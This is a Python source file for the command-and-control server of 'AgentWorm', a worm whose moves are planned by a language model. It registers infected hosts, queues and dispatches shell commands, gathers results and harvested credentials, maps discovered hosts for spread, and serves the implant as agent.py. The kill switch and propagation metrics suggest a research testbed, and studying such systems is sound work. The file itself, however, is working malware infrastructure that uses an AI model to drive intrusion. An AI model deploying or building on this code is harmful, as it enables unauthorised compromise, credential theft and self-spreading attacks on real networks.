import json
import logging
import os
import statistics
import uuid
from datetime import datetime, timezone
from pathlib import Path

from fastapi import BackgroundTasks, FastAPI, HTTPException
from fastapi.responses import FileResponse
from pydantic import BaseModel

from brain import Brain
from models import CommandRecord, HostMemory

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("c2")

app = FastAPI(title="AgentWorm C2")

hosts: dict[str, HostMemory] = {}
killed = False

# Unique ID for this C2 session — every LLM call and event is tagged with it (NFR-REP-01)
run_id = str(uuid.uuid4())
log.info("RUN_ID=%s", run_id)

brain = Brain(
    config_path="/configs/llm.yaml",
    skills_dir="/app/skills",
    run_id=run_id,
    log_dir="/runs",
)


class RegisterPayload(BaseModel):
    os: str
    hostname: str
    local_ip: str
    username: str
    tools: list[str]


class ResultPayload(BaseModel):
    cmd: str
    output: str


class QueuePayload(BaseModel):
    cmd: str


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def _infected_ips() -> set[str]:
    return {h.local_ip for h in hosts.values()}


def _known_creds_by_ip() -> dict:
    return {
        h.local_ip: {"username": h.username, "credentials": h.credentials_found}
        for h in hosts.values()
        if h.credentials_found
    }


def _relay_map() -> dict:
    return {h.local_ip: h.discovered_hosts for h in hosts.values()}


@app.post("/register")
def register(payload: RegisterPayload, background_tasks: BackgroundTasks):
    host_id = str(uuid.uuid4())[:8]
    host = HostMemory(
        host_id=host_id,
        registered_at=_now(),
        os=payload.os,
        hostname=payload.hostname,
        local_ip=payload.local_ip,
        username=payload.username,
        tools=payload.tools,
    )
    hosts[host_id] = host
    log.info(
        "REGISTERED host_id=%s hostname=%s ip=%s user=%s os=%s tools=%s",
        host_id,
        payload.hostname,
        payload.local_ip,
        payload.username,
        payload.os,
        payload.tools,
    )
    # LLM reasoning runs in the background — DBA HTTP call returns immediately
    background_tasks.add_task(brain.on_register, host)
    return {"host_id": host_id}


@app.get("/commands/{host_id}")
def get_commands(host_id: str):
    if killed:
        return {"commands": []}
    host = hosts.get(host_id)
    if host is None:
        raise HTTPException(status_code=404, detail="unknown host")
    cmds = list(host.command_queue)
    host.command_queue.clear()
    for cmd in cmds:
        host.history.append(CommandRecord(cmd=cmd, issued_at=_now()))
        log.info("DISPATCHED host_id=%s cmd=%r", host_id, cmd)
    return {"commands": cmds}


@app.post("/results/{host_id}")
def post_result(host_id: str, payload: ResultPayload, background_tasks: BackgroundTasks):
    host = hosts.get(host_id)
    if host is None:
        raise HTTPException(status_code=404, detail="unknown host")
    for record in reversed(host.history):
        if record.cmd == payload.cmd and record.result is None:
            record.result = payload.output
            record.returned_at = _now()
            break
    log.info("RESULT host_id=%s cmd=%r output=%r", host_id, payload.cmd, payload.output[:200])
    # LLM reasoning runs in the background — DBA HTTP call returns immediately
    background_tasks.add_task(
        brain.on_result, host, payload.cmd, payload.output,
        _infected_ips(), _known_creds_by_ip(), _relay_map(),
    )
    return {"status": "ok"}


@app.post("/queue/{host_id}")
def queue_command(host_id: str, payload: QueuePayload):
    host = hosts.get(host_id)
    if host is None:
        raise HTTPException(status_code=404, detail="unknown host")
    host.command_queue.append(payload.cmd)
    log.info("QUEUED host_id=%s cmd=%r", host_id, payload.cmd)
    return {"status": "queued", "host_id": host_id, "cmd": payload.cmd}


@app.post("/kill")
def kill_switch():
    global killed
    killed = True
    log.warning("KILL SWITCH ACTIVATED — all command dispatch halted")
    return {"status": "killed"}


@app.get("/hosts")
def list_hosts():
    return {hid: mem.to_dict() for hid, mem in hosts.items()}


@app.get("/dba")
def serve_dba():
    return FileResponse("/app/dba.py", media_type="text/plain", filename="agent.py")


@app.get("/health")
def health():
    return {"status": "ok", "killed": killed, "host_count": len(hosts), "run_id": run_id}


@app.get("/metrics")
def metrics():
    trace_path = Path("/runs") / run_id / "trace.jsonl"
    if not trace_path.exists():
        return {"error": "trace not found", "run_id": run_id}

    latencies: list[int] = []
    registrations: list[str] = []
    dispatched = results = credentials = milestones = 0
    propagation_complete = False

    with open(trace_path) as f:
        for line in f:
            e = json.loads(line)
            ev = e.get("event", "")
            if ev == "llm_completion" and "latency_ms" in e:
                latencies.append(e["latency_ms"])
            if ev == "milestone" and e.get("id") == "M-09":
                propagation_complete = True
                milestones += 1

    # Time-to-N-hosts from C2 log registration timestamps
    ordered = sorted(hosts.values(), key=lambda h: h.registered_at)
    t0 = ordered[0].registered_at if ordered else None
    time_to_n: dict[int, float] = {}
    if t0:
        from datetime import datetime, timezone
        t0_dt = datetime.fromisoformat(t0)
        for n, h in enumerate(ordered, start=1):
            tn = datetime.fromisoformat(h.registered_at)
            time_to_n[n] = round((tn - t0_dt).total_seconds(), 2)

    dispatched = sum(len(h.history) for h in hosts.values())
    results = sum(1 for h in hosts.values() for r in h.history if r.result is not None)
    credentials_count = sum(len(h.credentials_found) for h in hosts.values())

    return {
        "run_id": run_id,
        "host_count": len(hosts),
        "propagation_complete": propagation_complete,
        "time_to_n_hosts_seconds": time_to_n,
        "llm_latency_ms": {
            "count": len(latencies),
            "median": round(statistics.median(latencies), 1) if latencies else None,
            "p95": round(sorted(latencies)[int(len(latencies) * 0.95)] if latencies else 0, 1),
        },
        "commands_dispatched": dispatched,
        "results_received": results,
        "credentials_found": credentials_count,
    }


@app.get("/export")
def export():
    ordered = sorted(hosts.values(), key=lambda h: h.registered_at)
    return {
        "run_id": run_id,
        "run_started": ordered[0].registered_at if ordered else None,
        "host_count": len(hosts),
        "infection_sequence": [
            {"host_id": h.host_id, "hostname": h.hostname,
             "ip": h.local_ip, "registered_at": h.registered_at}
            for h in ordered
        ],
        "hosts": {hid: mem.to_dict() for hid, mem in hosts.items()},
    }
